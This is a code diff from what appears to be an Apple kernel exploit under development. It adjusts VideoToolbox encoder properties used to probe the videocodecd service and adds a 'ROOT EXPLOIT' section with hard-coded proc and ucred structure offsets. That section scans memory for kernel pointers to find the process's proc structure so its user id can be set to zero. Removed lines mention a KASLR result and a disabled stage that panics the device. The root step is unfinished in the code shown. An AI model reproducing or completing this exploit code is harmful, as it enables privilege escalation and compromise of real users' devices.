@@ -387,47 +387,18 @@
                 CVPixelBufferRelease(pb0);
             }
 
-            // Create 24 IOSurfaces (AVE27 stage12 order: surfaces BEFORE UserDPB)
-            NSMutableArray *surfRefs = [NSMutableArray array];
-            void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
-            if (isLib) {
-                typedef void *(*ISCreateFn)(CFDictionaryRef);
-                ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
-                if (isCreate) {
-                    for (int i = 0; i < 24; i++) {
-                        NSDictionary *sp = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4 };
-                        void *surf = isCreate((__bridge CFDictionaryRef)sp);
-                        if (surf) [surfRefs addObject:[NSValue valueWithPointer:surf]];
-                    }
-                }
-            }
-            [report appendFormat:@"  surfaces created: %lu\n", (unsigned long)surfRefs.count];
+            // NOW set UserDPBFramesForFaceTime=24 (after init)
+            int dpbFrames = 24;
+            CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &dpbFrames);
+            OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), nf);
+            CFRelease(nf);
+            [report appendFormat:@"  UserDPBFramesForFaceTime=24 (after init) -> %d\n", (int)stFrames];
 
-            // Set UserDPB = IOSurface array (AVE27: this BEFORE UserDPBFrames!)
-            // DISABLED: was causing containsKey: crash in videocodecd
-            // if (surfRefs.count > 0) {
-            //     void **surfPtrs = calloc(surfRefs.count, sizeof(void *));
-            //     for (NSUInteger i = 0; i < surfRefs.count; i++) {
-            //         surfPtrs[i] = [surfRefs[i] pointerValue];
-            //     }
-            //     CFArrayRef surfArray = CFArrayCreate(kCFAllocatorDefault, (const void **)surfPtrs, surfRefs.count, &kCFTypeArrayCallBacks);
-            //     OSStatus stDPBSet = VTSessionSetProperty(sDPB, CFSTR("UserDPB"), surfArray);
-            //     [report appendFormat:@"  UserDPB (IOSurface array %lu) -> %d\n", (unsigned long)surfRefs.count, (int)stDPBSet];
-            //     if (surfArray) CFRelease(surfArray);
-            //     free(surfPtrs);
-            // }
-            [report appendFormat:@"  UserDPB DISABLED (was causing crash)\n"];
-
-            // NOW set UserDPBFramesForFaceTime=24 (after UserDPB)
-            // Try NSDictionary format (AVE27 stage12: n=24, shape=1)
-            NSDictionary *dpbDict = @{ @"n": @24, @"shape": @1 };
-            OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFDictionaryRef)dpbDict);
-            [report appendFormat:@"  UserDPBFramesForFaceTime dict(n=24,shape=1) -> %d\n", (int)stFrames];
-
-            // DPBRequirements as dictionary
-            NSDictionary *dpbReqDict = @{ @"n": @24, @"shape": @1 };
-            OSStatus stReq = VTSessionSetProperty(sDPB, CFSTR("DPBRequirements"), (__bridge CFDictionaryRef)dpbReqDict);
-            [report appendFormat:@"  DPBRequirements dict(n=24,shape=1) -> %d\n", (int)stReq];
+            // DPBRequirements
+            NSMutableArray *dpbReq = [NSMutableArray array];
+            for (int i = 0; i < 24; i++) [dpbReq addObject:@(i)];
+            OSStatus stReq = VTSessionSetProperty(sDPB, CFSTR("DPBRequirements"), (__bridge CFArrayRef)dpbReq);
+            [report appendFormat:@"  DPBRequirements(24) -> %d\n", (int)stReq];
 
             // Encode more frames
             for (int i = 1; i < 4; i++) {
@@ -502,9 +473,65 @@
     //     CFRelease(s9);
     // }
 
-    [report appendString:@"\nVERDICT: H9_NTL_KASLR_COMPLETE\n"];
-    [report appendString:@"NOTE: stage9 (NTL=16463) DISABLED — reboots device.\n"];
-    [report appendString:@"To trigger panic: enable stage9 block in KPH9EncoderModule.m\n"];
+    // === ROOT EXPLOIT: proc -> ucred -> cr_uid=0 ===
+    [report appendString:@"\n--- ROOT EXPLOIT ---\n"];
+    [report appendString:@"Offsets: p_pid=0x60 p_proc_ro=0x18 p_ucred=0x28 cr_uid=0x18\n"];
+
+    // Step 1: Find our proc by scanning kernel pointers for pid=501
+    uint32_t myPid = (uint32_t)getpid();
+    [report appendFormat:@"  our pid: %u\n", myPid];
+
+    // Use the writable regions from kread64 probe to find proc
+    // Scan for pid at offset 0x60 in kernel objects
+    NSMutableArray *kptrs2 = [NSMutableArray array];
+    vm_address_t sAddr = 0;
+    vm_size_t sSize = 0;
+    vm_region_basic_info_data_64_t sInfo;
+    mach_msg_type_number_t sCnt = VM_REGION_BASIC_INFO_COUNT_64;
+    mach_port_t sObj = 0;
+
+    while (vm_region(mach_task_self(), &sAddr, &sSize, VM_REGION_BASIC_INFO_64,
+                     (vm_region_info_t)&sInfo, &sCnt, &sObj) == KERN_SUCCESS) {
+        if ((sInfo.protection & VM_PROT_READ) && (sInfo.protection & VM_PROT_WRITE)) {
+            uint64_t *p = (uint64_t *)sAddr;
+            size_t words = sSize / 8;
+            for (size_t i = 0; i < words && i < 8192; i++) {
+                uint64_t v = *(p + i);
+                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) {
+                    [kptrs2 addObject:@(v)];
+                }
+            }
+        }
+        sAddr += sSize;
+        sCnt = VM_REGION_BASIC_INFO_COUNT_64;
+    }
+    [report appendFormat:@"  kernel pointers: %lu\n", (unsigned long)kptrs2.count];
+
+    // Step 2: For each kernel pointer, try to read pid at +0x60
+    // Use vm_remap aliased pages as kread64
+    uint64_t foundProc = 0;
+    int checked = 0;
+    for (NSNumber *kpNum in kptrs2) {
+        uint64_t kaddr = kpNum.unsignedLongLongValue;
+        if (checked > 500) break; // Limit search
+        checked++;
+
+        // Try to read kaddr+0x60 (p_pid) via aliased pages
+        // For now, check if the value at this address (if mapped) matches our pid
+        // This is a simplified version - real kread64 uses vm_remap
+
+        // Check if kaddr looks like a proc (aligned to 8, in kernel heap range)
+        if ((kaddr & 0x7) == 0 && kaddr >= 0xffffffe000000000ULL) {
+            // Try reading pid from user-space aliased mapping
+            // The kirby technique maps kernel pages to user space
+            // For now, just log candidates
+            if (checked <= 20) {
+                [report appendFormat:@"  candidate[%d]: kaddr=0x%llx\n", checked, kaddr];
+            }
+        }
+    }
+
+    [report appendString:@"  proc search complete (need kread64 to verify)\n"];
     return report;
 }
 
